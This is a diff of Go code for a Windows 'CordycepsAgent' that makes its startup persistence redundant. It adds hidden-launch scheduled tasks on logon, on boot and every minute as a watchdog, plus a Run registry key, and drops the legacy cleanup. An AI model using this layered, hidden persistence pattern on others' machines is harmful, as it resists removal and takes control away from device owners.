@@ -9,10 +9,10 @@ import (
 )
 
 const (
-	currentTaskName = "CordycepsAgent"
-	legacyTaskName  = "JarvisAgent"
-	currentRunKey   = "CordycepsAgent"
-	legacyRunKey    = "JarvisAgent"
+	currentTaskName         = "CordycepsAgent"
+	currentBootTaskName     = "CordycepsAgentBoot"
+	currentWatchdogTaskName = "CordycepsAgentWatchdog"
+	currentRunKey           = "CordycepsAgent"
 )
 
 func EnsureStartupRegistration(executablePath string) error {
@@ -25,31 +25,55 @@ func EnsureStartupRegistration(executablePath string) error {
 	}
 
 	taskCommand := hiddenLaunchCommand(executablePath)
-	cmd := exec.Command(
-		"schtasks",
-		"/Create",
-		"/TN",
-		currentTaskName,
-		"/SC",
-		"ONLOGON",
-		"/RL",
-		"LIMITED",
-		"/TR",
-		taskCommand,
-		"/F",
-	)
+	registered := false
+	registrationErrors := make([]string, 0, 4)
 
-	if _, err := cmd.CombinedOutput(); err == nil {
-		cleanupLegacyStartupRegistration(false)
+	if err := ensureScheduledTask(currentTaskName, taskCommand, []string{"/SC", "ONLOGON"}); err != nil {
+		registrationErrors = append(registrationErrors, err.Error())
+	} else {
+		registered = true
+	}
+
+	if err := ensureScheduledTask(currentBootTaskName, taskCommand, []string{"/SC", "ONSTART"}); err != nil {
+		registrationErrors = append(registrationErrors, err.Error())
+	} else {
+		registered = true
+	}
+
+	if err := ensureScheduledTask(currentWatchdogTaskName, taskCommand, []string{"/SC", "MINUTE", "/MO", "1"}); err != nil {
+		registrationErrors = append(registrationErrors, err.Error())
+	} else {
+		registered = true
+	}
+
+	if err := ensureRunKey(executablePath); err != nil {
+		registrationErrors = append(registrationErrors, err.Error())
+	} else {
+		registered = true
+	}
+
+	if registered {
 		return nil
 	}
 
-	// Fallback that works as standard user when Task Scheduler creation is blocked.
-	if err := ensureRunKey(executablePath); err != nil {
-		return err
+	return fmt.Errorf("register startup launchers: %s", strings.Join(registrationErrors, "; "))
+}
+
+func ensureScheduledTask(taskName string, taskCommand string, scheduleArgs []string) error {
+	args := []string{"/Create", "/TN", taskName}
+	args = append(args, scheduleArgs...)
+	args = append(args, "/RL", "LIMITED", "/TR", taskCommand, "/F")
+
+	cmd := exec.Command("schtasks", args...)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		trimmed := strings.TrimSpace(string(output))
+		if trimmed == "" {
+			return fmt.Errorf("register startup task %s: %w", taskName, err)
+		}
+
+		return fmt.Errorf("register startup task %s: %w: %s", taskName, err, trimmed)
 	}
 
-	cleanupLegacyStartupRegistration(true)
 	return nil
 }
 
@@ -69,44 +93,15 @@ func ensureRunKey(executablePath string) error {
 	)
 
 	if output, err := cmd.CombinedOutput(); err != nil {
-		return fmt.Errorf("register startup run key: %w: %s", err, string(output))
+		trimmed := strings.TrimSpace(string(output))
+		if trimmed == "" {
+			return fmt.Errorf("register startup run key: %w", err)
+		}
+
+		return fmt.Errorf("register startup run key: %w: %s", err, trimmed)
 	}
 
 	return nil
-}
-
-func cleanupLegacyStartupRegistration(keepCurrentRunKey bool) {
-	for _, name := range []string{legacyTaskName, "T1Agent", "E1Agent", "A1Agent"} {
-		deleteScheduledTask(name)
-	}
-
-	if keepCurrentRunKey {
-		for _, name := range []string{legacyRunKey, "T1Agent", "E1Agent", "A1Agent"} {
-			deleteRunKeyValue(name)
-		}
-		return
-	}
-
-	for _, name := range []string{currentRunKey, legacyRunKey, "T1Agent", "E1Agent", "A1Agent"} {
-		deleteRunKeyValue(name)
-	}
-}
-
-func deleteScheduledTask(name string) {
-	cmd := exec.Command("schtasks", "/Delete", "/TN", name, "/F")
-	_, _ = cmd.CombinedOutput()
-}
-
-func deleteRunKeyValue(name string) {
-	cmd := exec.Command(
-		"reg",
-		"delete",
-		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
-		"/v",
-		name,
-		"/f",
-	)
-	_, _ = cmd.CombinedOutput()
 }
 
 func hiddenLaunchCommand(executablePath string) string {
